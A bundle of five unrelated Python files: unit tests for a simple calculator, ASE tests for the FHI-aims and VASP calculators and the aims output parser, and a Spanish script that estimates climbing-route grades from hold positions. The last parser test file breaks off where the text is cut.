{"0": "#!/usr/bin/python3\n# encoding='utf-8'\n# author:weibk\n# @time:2021/10/18 10:13\nimport unittest\nfrom Calcium import Calcium\n\n\nclass CalcTest(unittest.TestCase):\n    def test_add1(self):\n        calc = Calcium()\n        self.assertEqual(calc.add(7, 8), 15)\n\n    def test_add2(self):\n        calc = Calcium()\n        self.assertEqual(calc.add(-7, 8), 1)\n\n    def test_add3(self):\n        calc = Calcium()\n        self.assertEqual(calc.add(7, -8), -1)\n\n    def test_add4(self):\n        calc = Calcium()\n        self.assertEqual(calc.add(0, 8), 8)\n\n    def test_add5(self):\n        calc = Calcium()\n        self.assertEqual(calc.add(0, -8), -8)\n\n    def test_add6(self):\n        calc = Calcium()\n        self.assertEqual(calc.add(0, 0), 0)\n\n    def test_minus1(self):\n        calc = Calcium()\n        self.assertEqual(calc.minus(7, 8), -1)\n\n    def test_minus2(self):\n        calc = Calcium()\n        self.assertEqual(calc.minus(8, 7), 1)\n\n    def test_minus3(self):\n        calc = Calcium()\n        self.assertEqual(calc.minus(0, 8), -8)\n\n    def test_minus4(self):\n        calc = Calcium()\n        self.assertEqual(calc.minus(0, -8), 8)\n\n    def test_minus5(self):\n        calc = Calcium()\n        self.assertEqual(calc.minus(8, 0), 8)\n\n    def test_minus6(self):\n        calc = Calcium()\n        self.assertEqual(calc.minus(-8, 0), -8)\n\n    def test_multiply1(self):\n        calc = Calcium()\n        self.assertEqual(calc.multiply(1, 8), 8)\n\n    def test_multiply2(self):\n        calc = Calcium()\n        self.assertEqual(calc.multiply(0, 8), 0)\n\n    def test_multiply3(self):\n        calc = Calcium()\n        self.assertEqual(calc.multiply(5, 8), 40)\n\n    def test_multiply4(self):\n        calc = Calcium()\n        self.assertEqual(calc.multiply(-5, 8), -40)\n\n    def test_multiply5(self):\n        calc = Calcium()\n        self.assertEqual(calc.multiply(-5, -8), 40)\n\n    def test_divide1(self):\n        calc = Calcium()\n        self.assertEqual(calc.divide(10, 5), 2)\n\n    def test_divide2(self):\n        calc = Calcium()\n        self.assertEqual(calc.divide(10, -5), -2)\n\n    def test_divide3(self):\n        calc = Calcium()\n        self.assertEqual(calc.divide(-10, 5), -2)\n\n    def test_divide4(self):\n        calc = Calcium()\n        self.assertEqual(calc.divide(-10, -5), 2)\n\n    def test_divide5(self):\n        calc = Calcium()\n        self.assertEqual(calc.divide(0, 10), 0)\n\n    def test_divide6(self):\n        calc = Calcium()\n        self.assertEqual(calc.divide(0, -10), 0)\n\n    def test_divide7(self):\n        calc = Calcium()\n        with self.assertRaises(ZeroDivisionError):\n            calc.divide(10, 0)\n\n    def test_divide8(self):\n        calc = Calcium()\n        with self.assertRaises(ZeroDivisionError):\n            calc.divide(-10, 0)\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "1": "import tempfile\nimport os\n\nimport pytest\nfrom ase.calculators.aims import Aims\nfrom ase import Atoms\n\n\n@pytest.mark.skip('legacy test with hardcoded paths and commands')\ndef test_aims_interface():\n    # test the new command handling + legacy behavior\n    aims_command = 'aims.x'\n    aims_command_alternative = 'mpirun -np 4 fhiaims.x'\n    outfilename = 'alternative_aims.out'\n    outfilename_default = 'aims.out'\n    command = '{0:s} > {1:s}'.format(aims_command, outfilename)\n    command_default = '{0:s} > {1:s}'.format(aims_command, outfilename_default)\n    legacy_command = 'aims.version.serial.x > aims.out'\n    legacy_aims_command = legacy_command.split('>')[0].strip()\n    legacy_outfilename = legacy_command.split('>')[-1].strip()\n\n    # legacy behavior of empty init\n    calc = Aims()\n    assert calc.command == legacy_command\n    assert calc.outfilename == legacy_outfilename\n    assert calc.aims_command == legacy_aims_command\n\n    # behavior of empty init with env variable\n    os.environ['ASE_AIMS_COMMAND'] = aims_command_alternative\n    calc = Aims()\n    assert calc.command == '{0} > {1}'.format(\n        aims_command_alternative, outfilename_default)\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command_alternative\n\n    # legacy behavior of \"proper\" command\n    calc = Aims(run_command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # legacy behavior of an \"improper\" command\n    calc = Aims(run_command=aims_command)\n    assert calc.command == command_default\n    assert calc.aims_command == aims_command\n    assert calc.outfilename == outfilename_default\n\n    # fixed \"command\"  behavior\n    calc = Aims(command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # novel way to use aims_command, no specific outfile\n    calc = Aims(aims_command=aims_command)\n    assert calc.command == command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n\n    calc = Aims(aims_command=aims_command,\n                outfilename=outfilename)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # # testing the setters\n    calc.command = command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n    assert calc.command == command_default\n\n    # calc.set_aims_command(aims_command_alternative)\n    calc.aims_command = aims_command_alternative\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename_default\n    assert calc.command == '{} > {}'.format(\n        aims_command_alternative, outfilename_default)\n\n    calc.outfilename = outfilename\n    assert calc.command == '{} > {}'.format(\n        aims_command_alternative, outfilename)\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename\n\n    # test writing files\n    tmp_dir = tempfile.mkdtemp()\n    water = Atoms('HOH', [(1, 0, 0), (0, 0, 0), (0, 1, 0)])\n    calc = Aims(xc='PBE',\n                output=['dipole'],\n                sc_accuracy_etot=1e-6,\n                sc_accuracy_eev=1e-3,\n                sc_accuracy_rho=1e-6,\n                species_dir=\"/data/rittmeyer/FHIaims/species_defaults/light/\",\n                sc_accuracy_forces=1e-4,\n                label=tmp_dir,\n                )\n    try:\n        calc.prepare_input_files()\n        raise AssertionError\n    except ValueError:\n        pass\n\n    calc.atoms = water\n    calc.prepare_input_files()\n    for f in ['control.in', 'geometry.in']:\n        assert os.path.isfile(os.path.join(tmp_dir, f))\n", "2": "from tkinter.constants import ROUND\nimport db\n\ndef calcular(id):\n\n    global multiplicadorRatios\n\n    db.consultaVisor(id)\n    viaCalc= str(db.itemsVisor).split(\", \")\n\n    inicioCalcX=[]\n    inicioCalcY=[]\n    rutaCalcX=[]\n    rutaCalcY=[]\n    topCalcX=[]\n    topCalcY=[]\n\n    numIniciPresas= int(len(str(viaCalc[4].replace(\"'\",\"\").replace(\"-\",\"\")))/4)\n    numRutaPresas= int(len(str(viaCalc[5].replace(\"'\",\"\").replace(\"-\",\"\")))/4)\n    numTopPresas= int(len(str(viaCalc[6].replace(\"'\",\"\").replace(\"-\",\"\")))/4)\n    numTotalPresas= numIniciPresas + numRutaPresas + numTopPresas\n\n    columnas= int(viaCalc[7])\n    filas= int(viaCalc[8])\n        \n    n=2\n    inicioCalc= [str(viaCalc[4].replace(\"'\",\"\").replace(\"-\",\"\"))[index : index + n] for index in range(0, len(str(viaCalc[4].replace(\"'\",\"\").replace(\"-\",\"\"))), n)]\n    for i in inicioCalc[::2]:\n        inicioCalcY.append(i)\n    for i in inicioCalc[1::2]:\n        inicioCalcX.append(i)\n            \n    rutaCalc= [str(viaCalc[5].replace(\"'\",\"\").replace(\"-\",\"\"))[index : index + n] for index in range(0, len(str(viaCalc[5].replace(\"'\",\"\").replace(\"-\",\"\"))), n)] \n    for i in rutaCalc[::2]:\n        rutaCalcY.append(i)\n    for i in rutaCalc[1::2]:\n        rutaCalcX.append(i)\n\n    topCalc= [str(viaCalc[6].replace(\"'\",\"\").replace(\"-\",\"\"))[index : index + n] for index in range(0, len(str(viaCalc[6].replace(\"'\",\"\").replace(\"-\",\"\"))), n)] \n    for i in topCalc[::2]:\n        topCalcY.append(i)\n    for i in topCalc[1::2]:\n        topCalcX.append(i)\n\n    viaCalcY= inicioCalcY + rutaCalcY + topCalcY\n    viaCalcX= inicioCalcX + rutaCalcX + topCalcX\n\n    #RATIOS -------------------------------------------------------------------------------------------------------------------------------------\n    \n    #COMO M\u00c1S SE ACERQUE A 1, M\u00c1S DIF\u00cdCIL\n\n    # 1 - Porcentaje de ocupaci\u00f3n de las presas en el tablero\n    ratioDimensiones= round(1-(numTotalPresas/(columnas*filas)), 3)\n    \n    # 2 - Distancia de la primera presa de todas en relaci\u00f3n con la \u00faltima o pen\u00faltima en el eje Y\n    ratioInicioTopY = round((abs(int(inicioCalcY[0]) - int(topCalcY[0])+1))/filas, 3)\n\n    # 3 - Distancia de la primera presa de todas en relaci\u00f3n con la \u00faltima o pen\u00faltima en el eje X\n    ratioInicioTopX = round((abs(int(inicioCalcX[0]) - int(topCalcX[0])+1))/columnas, 3)\n\n    # 4 - Distancia entre cada una de las presas con la siguiente\n    ratioDistanciaY= []\n    ratioDistanciaX= []\n    ratioDistancia= 0\n    for i in range(int(((len(inicioCalc) + len(rutaCalc) + len(topCalc))/2)-1)):\n        ratioDistanciaY.append(abs(int(viaCalcY[i])-int(viaCalcY[i+1])))  \n    for i in range(int(((len(inicioCalc) + len(rutaCalc) + len(topCalc))/2)-1)):\n        ratioDistanciaX.append(abs(int(viaCalcX[i])-int(viaCalcX[i+1])))\n    for i in range(len(ratioDistanciaY)):\n        ratioDistancia = ratioDistancia + ratioDistanciaY[i] + ratioDistanciaX[i]\n\n    ratioDistancia= ratioDistancia + 1\n    ratioDistancia= round(1 - abs(numTotalPresas/ratioDistancia) ,3)\n\n    # 5 - Inclinaci\u00f3n (0\u00ba = 0% , 80\u00ba = 100%)\n    ratioInclinacion= (1/80*int(viaCalc[9][:-2]))\n\n    #------------------------------------------------------\n\n    ratioInicioTop= (ratioInicioTopY + ratioInicioTopX) / 2\n\n    multiplicadorRatios = round( (ratioDimensiones + ratioInicioTop + ratioDistancia + (ratioInclinacion*2))/     5    *10, 3)\n\n\n\n    # IMPRESIONES POR CONSOLA ---------------------------------------------------------------------------------------------------------------------\n    \n    # print(\"\\tPresas por tipo: \" + str(numIniciPresas) + \" \" + str(numRutaPresas) + \" \" + str(numTopPresas))\n    # print(\"\\tColumnas x filas: \" + str(columnas) + \" \" + str(filas))\n\n    # print(\"\\tInicio: \" + str(viaCalc[4]))\n    # print(\"\\t\\t\" + str(inicioCalcX))\n    # print(\"\\t\\t\" + str(inicioCalcY))\n    # print(\"\\tRuta: \" + str(viaCalc[5]))\n    # print(\"\\t\\t\" + str(rutaCalcX))\n    # print(\"\\t\\t\" + str(rutaCalcY))\n    # print(\"\\tTop: \" + str(viaCalc[6]))\n    # print(\"\\t\\t\" + str(topCalcX))\n    # print(\"\\t\\t\" + str(topCalcY))\n    # print(\"\\tPresas via eje X concatenadas: \" + str(viaCalcX))\n    # print(\"\\tPresas via eje Y concatenadas: \" + str(viaCalcY))\n\n    print(\"\\n\\t---------Ratios-----------------------\")\n    print(\"\\tDimensiones: \" + str(ratioDimensiones))\n    print(\"\\tDistancia inicio top Y: \" + str(ratioInicioTopY))\n    print(\"\\tDistancia inicio top X: \" + str(ratioInicioTopX))\n    print(\"\\tRatio distancia entre cada presa: \" + str(ratioDistancia))\n    print(\"\\tRatio inclinaci\u00f3n: \" + str(ratioInclinacion))\n    #print()\n    print(\"\\t----------------------------------------\")\n    itemsPrint= str(db.itemsVisor).split(\",\")\n    print(\"\\t\" + str(itemsPrint[0].replace(\"[(\",\"\")) + \" - \" + str(itemsPrint[1].replace(\"'\",\"\")))\n    print(\"\\t = \" + str(multiplicadorRatios))\n\n    calcNivelAprox()\n\n    print(\"\\t = \" + str(nivelAprox))\n    print(\"\\tWORK IN PROGRESS\")\n    print(\"Se aceptan sugerencias y aportaciones: gerard.ggf@gmail.com\")\n\n\n# PUNTUACI\u00d3N DEL 1 AL 10 A ASIGNACI\u00d3N DE NIVEL DE ESCALADA --------------------------------------------------------------------------------------------------------\n\ndef calcNivelAprox():\n\n    global nivelAprox\n\n    if(multiplicadorRatios>0) and (multiplicadorRatios<1):\n        nivelAprox= \"III\"\n    elif(multiplicadorRatios>=1) and (multiplicadorRatios<2.5):\n        nivelAprox= \"IV\"\n    elif(multiplicadorRatios>=2.5) and (multiplicadorRatios<3.5):\n        nivelAprox= \"V\"\n    elif(multiplicadorRatios>=3.5) and (multiplicadorRatios<4.5):\n        nivelAprox= \"V+\"\n\n    elif(multiplicadorRatios>=4.5) and (multiplicadorRatios<5):\n        nivelAprox= \"6A\"\n    elif(multiplicadorRatios>=5) and (multiplicadorRatios<5.5):\n        nivelAprox= \"6A+\"\n    elif(multiplicadorRatios>=5.5) and (multiplicadorRatios<6):\n        nivelAprox= \"6B\"\n    elif(multiplicadorRatios>=6) and (multiplicadorRatios<6.5):\n        nivelAprox= \"6B+\"\n    elif(multiplicadorRatios>=6.5) and (multiplicadorRatios<7):\n        nivelAprox= \"6C\"\n    elif(multiplicadorRatios>=7) and (multiplicadorRatios<7.4):\n        nivelAprox= \"6C+\"\n    \n    elif(multiplicadorRatios>=7.4) and (multiplicadorRatios<7.8):\n        nivelAprox= \"7A\"\n    elif(multiplicadorRatios>=7.8) and (multiplicadorRatios<8.2):\n        nivelAprox= \"7A+\"\n    elif(multiplicadorRatios>=8.2) and (multiplicadorRatios<8.5):\n        nivelAprox= \"7B\"\n    elif(multiplicadorRatios>=8.5) and (multiplicadorRatios<8.7):\n        nivelAprox= \"7B+\"\n    elif(multiplicadorRatios>=8.7) and (multiplicadorRatios<8.85):\n        nivelAprox= \"7C\"\n    elif(multiplicadorRatios>=8.85) and (multiplicadorRatios<9):\n        nivelAprox= \"7C+\"\n\n    elif(multiplicadorRatios>=9) and (multiplicadorRatios<9.1):\n        nivelAprox= \"8A\"\n    elif(multiplicadorRatios>=9.1) and (multiplicadorRatios<9.2):\n        nivelAprox= \"8A+\"\n    elif(multiplicadorRatios>=9.2) and (multiplicadorRatios<9.3):\n        nivelAprox= \"8B\"\n    elif(multiplicadorRatios>=9.3) and (multiplicadorRatios<9.4):\n        nivelAprox= \"8B+\"\n    elif(multiplicadorRatios>=9.4) and (multiplicadorRatios<9.5):\n        nivelAprox= \"8C\"\n    elif(multiplicadorRatios>=9.5) and (multiplicadorRatios<9.6):\n        nivelAprox= \"8C+\"\n\n    elif(multiplicadorRatios>=9.6) and (multiplicadorRatios<9.68):\n        nivelAprox= \"9A\"\n    elif(multiplicadorRatios>=9.68) and (multiplicadorRatios<9.76):\n        nivelAprox= \"9A+\"\n    elif(multiplicadorRatios>=9.76) and (multiplicadorRatios<9.84):\n        nivelAprox= \"9B\"\n    elif(multiplicadorRatios>=9.84) and (multiplicadorRatios<9.9):\n        nivelAprox= \"9B+\"\n    elif(multiplicadorRatios>=9.9) and (multiplicadorRatios<9.95):\n        nivelAprox= \"9C\"\n    elif(multiplicadorRatios>=9.95) and (multiplicadorRatios<=9.97):\n        nivelAprox= \"9C+\"\n\n    elif(multiplicadorRatios>=9.97) and (multiplicadorRatios<9.975):\n        nivelAprox= \"10A\"\n    elif(multiplicadorRatios>=9.975) and (multiplicadorRatios<9.98):\n        nivelAprox= \"10A+\"\n    elif(multiplicadorRatios>=9.98) and (multiplicadorRatios<9.985):\n        nivelAprox= \"10B\"\n    elif(multiplicadorRatios>=9.985) and (multiplicadorRatios<9.99):\n        nivelAprox= \"10B+\"\n    elif(multiplicadorRatios>=9.99) and (multiplicadorRatios<9.995):\n        nivelAprox= \"10C\"\n    elif(multiplicadorRatios>=9.995) and (multiplicadorRatios<=9.998):\n        nivelAprox= \"10C+\"\n    elif(multiplicadorRatios>=9.998) and (multiplicadorRatios<=10):\n        nivelAprox= \"11A\"\n    \n\n    else:\n        nivelAprox=\"\u00bf?\"", "3": "import pytest\nfrom ase.build import bulk\n\ncalc = pytest.mark.calculator\n\n\n@pytest.fixture\ndef system():\n    return bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n@pytest.fixture\ndef expected_nelect_from_vasp():\n    # Expected number of electrons from the specified system\n    # with no charge\n    return 12\n\n\n@calc('vasp')\ndef test_vasp_charge(factory, system, expected_nelect_from_vasp):\n    \"\"\"\n    Run VASP tests to ensure that determining number of electrons from\n    user-supplied charge works correctly.\n\n    Test that the number of charge found matches the expected.\n    \"\"\"\n\n    # Dummy calculation to let VASP determine default number of electrons\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False)\n    system.calc = calc\n    system.get_potential_energy()\n\n    default_nelect_from_vasp = calc.get_number_of_electrons()\n    assert default_nelect_from_vasp == expected_nelect_from_vasp\n\n\n@calc('vasp')\ndef test_vasp_no_inputs(system, factory):\n    # Make sure that no nelect was written into INCAR yet (as it wasn't\n    # necessary)\n    calc = factory.calc()\n    system.calc = calc\n    system.get_potential_energy()\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n\n\n@calc('vasp')\ndef test_vasp_minus_charge(factory, system, expected_nelect_from_vasp):\n    # Compare VASP's output nelect from before minus charge to default nelect\n    # determined by us minus charge\n    charge = -2\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        charge=charge)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] == expected_nelect_from_vasp - charge\n\n\n@calc('vasp')\ndef test_vasp_nelect_charge_conflict(factory, system,\n                                     expected_nelect_from_vasp):\n    # Test that conflicts between explicitly given nelect and charge are\n    # detected\n    charge = -2\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        nelect=expected_nelect_from_vasp - charge + 1,\n                        charge=charge)\n    system.calc = calc\n    with pytest.raises(ValueError):\n        system.get_potential_energy()\n\n\n@calc('vasp')\ndef test_vasp_nelect_no_write(factory, system):\n    # Test that nothing is written if charge is 0 and nelect not given\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        charge=0)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n\n\n@calc('vasp')\ndef test_vasp_nelect(factory, system):\n    # Test that explicitly given nelect still works as expected\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        nelect=15)\n    calc.calculate(system)\n    assert calc.get_number_of_electrons() == 15\n", "4": "# flake8: noqa\nimport numpy as np\nfrom ase.io import read\nfrom ase.io.aims import (\n    AimsParseError,\n    AimsOutChunk,\n    AimsOutHeaderChunk,\n    AimsOutCalcChunk,\n    LINE_NOT_FOUND,\n)\nfrom ase.stress import full_3x3_to_voigt_6_stress\n\nfrom numpy.linalg import norm\n\nimport pytest\n\neps_hp = 1e-15  # The espsilon value used to compare numbers that are high-precision\neps_lp = 1e-7  # The espsilon value used to compare numbers that are low-precision\n\n\n@pytest.fixture\ndef default_chunk():\n    lines = [\"TEST\", \"A\", \"TEST\", \"| Number of atoms: 200 atoms\"]\n    return AimsOutChunk(lines)\n\n\ndef test_reverse_search_for(default_chunk):\n    assert default_chunk.reverse_search_for([\"TEST\"]) == 2\n    assert default_chunk.reverse_search_for([\"TEST\"], 1) == 2\n\n    assert default_chunk.reverse_search_for([\"TEST A\"]) == LINE_NOT_FOUND\n\n    assert default_chunk.reverse_search_for([\"A\"]) == 1\n    assert default_chunk.reverse_search_for([\"A\"], 2) == LINE_NOT_FOUND\n\n\ndef test_search_for_all(default_chunk):\n    assert default_chunk.search_for_all(\"TEST\") == [0, 2]\n    assert default_chunk.search_for_all(\"TEST\", 0, 1) == [0]\n    assert default_chunk.search_for_all(\"TEST\", 1, -1) == [2]\n\n\ndef test_search_parse_scalar(default_chunk):\n    assert default_chunk.parse_scalar(\"n_atoms\") == 200\n    assert default_chunk.parse_scalar(\"n_electrons\") is None\n\n\n@pytest.fixture\ndef empty_header_chunk():\n    return AimsOutHeaderChunk([])\n\n\n@pytest.mark.parametrize(\n    \"attrname\",\n    [\n        \"n_atoms\",\n        \"n_bands\",\n        \"n_electrons\",\n        \"n_spins\",\n        \"initial_atoms\",\n    ],\n)\ndef test_missing_parameter(attrname, empty_header_chunk):\n    with pytest.raises(AimsParseError, match=\"No information about\"):\n        getattr(empty_header_chunk, attrname)\n\n\ndef test_default_header_electronic_temperature(empty_header_chunk):\n    assert empty_header_chunk.electronic_temperature == 0.1\n\n\ndef test_default_header_constraints(empty_header_chunk):\n    assert empty_header_chunk.constraints == []\n\n\ndef test_default_header_initial_cell(empty_header_chunk):\n    assert empty_header_chunk.initial_cell is None\n\n\ndef test_default_header_is_md(empty_header_chunk):\n    assert not empty_header_chunk.is_md\n\n\ndef test_default_header_is_relaxation(empty_header_chunk):\n    assert not empty_header_chunk.is_relaxation\n\n\ndef test_default_header_n_k_points(empty_header_chunk):\n    assert empty_header_chunk.n_k_points is None\n\n\ndef test_default_header_k_points(empty_header_chunk):\n    assert empty_header_chunk.k_points is None\n\n\ndef test_default_header_k_point_weights(empty_header_chunk):\n    assert empty_header_chunk.k_point_weights is None\n\n\n@pytest.fixture\ndef initial_cell():\n    return np.array(\n        [\n            [1.00000000, 2.70300000, 3.70300000],\n            [4.70300000, 2.00000000, 6.70300000],\n            [8.70300000, 7.70300000, 3.00000000],\n        ]\n    )\n\n\n@pytest.fixture\ndef initial_positions():\n    return (np.array([[0.000, 1.000, 2.000], [2.703, 3.703, 4.703]]),)\n\n\n@pytest.fixture\ndef header_chunk():\n    lines = \"\"\"\n        | Number of atoms                   :        2\n        | Number of Kohn-Sham states (occupied + empty):       3\n        The structure contains        2 atoms,  and a total of         28.000 electrons.\n        | Number of spin channels           :        2\n        Occupation type: Gaussian broadening, width =   0.500000E-01 eV.\n        Found relaxation constraint for atom      1: x coordinate fixed.\n        Found relaxation constraint for atom      1: y coordinate fixed.\n        Found relaxation constraint for atom      2: All coordinates fixed.\n        Input geometry:\n        | Unit cell:\n        |        1.00000000        2.70300000        3.70300000\n        |        4.70300000        2.00000000        6.70300000\n        |        8.70300000        7.70300000        3.00000000\n        | Atomic structure:\n        |       Atom                x [A]            y [A]            z [A]\n        |    1: Species Na            0.00000000        1.00000000        2.00000000\n        |    2: Species Cl            2.70300000        3.70300000        4.70300000\n        Initializing the k-points\n        Using symmetry for reducing the k-points\n        | k-points reduced from:        8 to        8\n        | Number of k-points                             :         8\n        The eigenvectors in the calculations are REAL.\n        | K-points in task   0:         2\n        | K-points in task   1:         2\n        | K-points in task   2:         2\n        | K-points in task   3:         2\n        | k-point: 1 at     0.000000    0.000000    0.000000  , weight:   0.12500000\n        | k-point: 2 at     0.000000    0.000000    0.500000  , weight:   0.12500000\n        | k-point: 3 at     0.000000    0.500000    0.000000  , weight:   0.12500000\n        | k-point: 4 at     0.000000    0.500000    0.500000  , weight:   0.12500000\n        | k-point: 5 at     0.500000    0.000000    0.000000  , weight:   0.12500000\n        | k-point: 6 at     0.500000    0.000000    0.500000  , weight:   0.12500000\n        | k-point: 7 at     0.500000    0.500000    0.000000  , weight:   0.12500000\n        | k-point: 8 at     0.500000    0.500000    0.500000  , weight:   0.12500000\n        Geometry relaxation: A file \"geometry.in.next_step\" is written out by default after each step.\n        Complete information for previous time-step:\n    \"\"\"\n    lines = lines.splitlines()\n    for ll, line in enumerate(lines):\n        lines[ll] = line.strip()\n\n    return AimsOutHeaderChunk(lines)\n\n\ndef test_header_n_atoms(header_chunk):\n    assert header_chunk.n_atoms == 2\n\n\ndef test_header_n_bands(header_chunk):\n    assert header_chunk.n_bands == 3\n\n\ndef test_header_n_electrons(header_chunk):\n    assert header_chunk.n_electrons == 28\n\n\ndef test_header_n_spins(header_chunk):\n    assert header_chunk.n_spins == 2\n\n\ndef test_header_constraints(header_chunk):\n    assert len(header_chunk.constraints) == 2\n    assert header_chunk.constraints[0].index == 0\n    assert header_chunk.constraints[1].index == 1\n    assert np.all(header_chunk.constraints[0].mask == [False, False, True])\n\n\ndef test_header_initial_atoms(header_chunk, initial_cell, initial_positions):\n    assert len(header_chunk.initial_atoms) == 2\n    assert np.allclose(\n        header_chunk.initial_atoms.cell,\n        initial_cell,\n    )\n    assert np.allclose(header_chunk.initial_atoms.positions, initial_positions)\n    assert np.all([\"Na\", \"Cl\"] == header_chunk.initial_atoms.symbols)\n    assert all(\n        [\n            str(const_1) == str(const_2)\n            for const_1, const_2 in zip(\n                header_chunk.constraints, header_chunk.initial_atoms.constraints\n            )\n        ]\n    )\n\n\ndef test_header_initial_cell(header_chunk, initial_cell):\n    assert np.allclose(header_chunk.initial_cell, initial_cell)\n\n\ndef test_header_electronic_temperature(header_chunk):\n    assert header_chunk.electronic_temperature == 0.05\n\n\ndef test_header_is_md(header_chunk):\n    assert header_chunk.is_md\n\n\ndef test_header_is_relaxation(header_chunk):\n    assert header_chunk.is_relaxation\n\n\ndef test_header_n_k_points(header_chunk):\n    assert header_chunk.n_k_points == 8\n\n\n@pytest.fixture\ndef k_points():\n    return np.array(\n        [\n            [0.000, 0.000, 0.000],\n            [0.000, 0.000, 0.500],\n            [0.000, 0.500, 0.000],\n            [0.000, 0.500, 0.500],\n            [0.500, 0.000, 0.000],\n            [0.500, 0.000, 0.500],\n            [0.500, 0.500, 0.000],\n            [0.500, 0.500, 0.500],\n        ]\n    )\n\n\n@pytest.fixture\ndef k_point_weights():\n    return np.full((8), 0.125)\n\n\ndef test_header_k_point_weights(header_chunk, k_point_weights):\n    assert np.allclose(header_chunk.k_point_weights, k_point_weights)\n\n\ndef test_header_k_points(header_chunk, k_points):\n    assert np.allclose(header_chunk.k_points, k_points)\n\n\ndef test_header_header_summary(header_chunk, k_points, k_point_weights):\n    header_summary = {\n        \"initial_atoms\": header_chunk.initial_atoms,\n        \"initial_cell\": header_chunk.initial_cell,\n        \"constraints\": header_chunk.constraints,\n        \"is_relaxation\": True,\n        \"is_md\": True,\n        \"n_atoms\": 2,\n        \"n_bands\": 3,\n        \"n_electrons\": 28,\n        \"n_spins\": 2,\n        \"electronic_temperature\": 0.05,\n        \"n_k_points\": 8,\n        \"k_points\": k_points,\n        \"k_point_weights\": k_point_weights,\n    }\n    for key, val in header_chunk.header_summary.items():\n        if isinstance(val, np.ndarray):\n            assert np.allclose(val, header_summary[key])\n        else:\n            assert val == header_summary[key]\n\n\n@pytest.fixture\ndef empty_calc_chunk(header_chunk):\n    return AimsOutCalcChunk([], header_chunk)\n\n\ndef test_header_transfer_n_atoms(empty_calc_chunk):\n    assert empty_calc_chunk.n_atoms == 2\n\n\ndef test_header_transfer_n_bands(empty_calc_chunk):\n    assert empty_calc_chunk.n_bands == 3\n\n\ndef test_header_transfer_n_electrons(empty_calc_chunk):\n    assert empty_calc_chunk.n_electrons == 28\n\n\ndef test_header_transfer_n_spins(empty_calc_chunk):\n    assert empty_calc_chunk.n_spins == 2\n\n\ndef test_header_transfer_constraints(empty_calc_chunk):\n    assert len(empty_calc_chunk.constraints) == 2\n    assert empty_calc_chunk.constraints[0].index == 0\n    assert empty_calc_chunk.constraints[1].index == 1\n    assert np.all(empty_calc_chunk.constraints[0].mask == [False, False, True])\n\n\ndef test_header_transfer_initial_cell(empty_calc_chunk, initial_cell):\n    assert np.allclose(empty_calc_chunk.initial_cell, initial_cell)\n\n\ndef test_header_transfer_initial_atoms(\n    empty_calc_chunk, initial_cell, initial_positions\n):\n    assert np.allclose(\n        empty_calc_chunk.initial_atoms.cell, empty_calc_chunk.initial_cell\n    )\n    assert len(empty_calc_chunk.initial_atoms) == 2\n    assert np.allclose(empty_calc_chunk.initial_atoms.cell, initial_cell)\n    assert np.allclose(\n        empty_calc_chunk.initial_atoms.positions,\n        initial_positions)\n    assert np.all([\"Na\", \"Cl\"] == empty_calc_chunk.initial_atoms.symbols)\n    assert all(\n        [\n            str(const_1) == str(const_2)\n            for const_1, const_2 in zip(\n                empty_calc_chunk.constraints, empty_calc_chunk.initial_atoms.constraints\n            )\n        ]\n    )\n\n\ndef test_header_transfer_electronic_temperature(empty_calc_chunk):\n    assert empty_calc_chunk.electronic_temperature == 0.05\n\n\ndef test_header_transfer_n_k_points(empty_calc_chunk):\n    assert empty_calc_chunk.n_k_points == 8\n\n\ndef test_header_transfer_k_point_weights(empty_calc_chunk, k_point_weights):\n    assert np.allclose(empty_calc_chunk.k_point_weights, k_point_weights)\n\n\ndef test_header_transfer_k_points(empty_calc_chunk, k_points):\n    assert np.allclose(empty_calc_chunk.k_points, k_points)\n\n\ndef test_default_calc_energy_raises_error(empty_calc_chunk):\n    with pytest.raises(\n        AimsParseError, match=\"No energy is associated with the structure.\"\n    ):\n        getattr(empty_calc_chunk, \"energy\")\n\n\n@pytest.mark.parametrize(\n    \"attrname\",\n    [\n        \"forces\",\n        \"stresses\",\n        \"stress\",\n        \"free_energy\",\n        \"n_iter\",\n        \"magmom\",\n        \"E_f\",\n        \"dipole\",\n        \"hirshfeld_charges\",\n        \"hirshfeld_volumes\",\n        \"hirshfeld_atomic_dipoles\",\n        \"hirshfeld_dipole\",\n        \"eigenvalues\",\n        \"occupancies\",\n    ],\n)\ndef test_chunk_defaults_none(attrname, empty_calc_chunk):\n    assert getattr(empty_calc_chunk, attrname) is None\n\n\ndef test_default_calc_is_metallic(empty_calc_chunk):\n    assert not empty_calc_chunk.is_metallic\n\n\ndef test_default_calc_converged(empty_calc_chunk):\n    assert not empty_calc_chunk.converged\n\n\n@pytest.fixture\ndef calc_chunk(header_chunk):\n    lines = \"\"\"\n        | Number of self-consistency cycles          :           58\n        | N = N_up - N_down (sum over all k points):         0.00000\n        | Chemical potential (Fermi level):    -8.24271207 eV\n        Total atomic forces (unitary forces were cleaned, then relaxation constraints were applied) 